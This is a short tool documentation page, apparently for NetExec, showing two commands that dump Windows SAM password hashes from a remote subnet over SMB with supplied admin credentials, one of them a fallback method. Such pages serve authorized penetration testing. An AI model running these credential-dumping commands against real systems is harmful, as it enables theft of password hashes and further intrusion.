# Dump SAM

### Dump SAM hashes using methods from secretsdump.py

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

```bash
nxc smb $TARGET/24 -u $USER -p $PASSWORD --sam
```

If this command fail you can also try the old method (similar to secretdump)

```bash
nxc smb $TARGET/24 -u $USER -p $PASSWORD --sam secdump
```
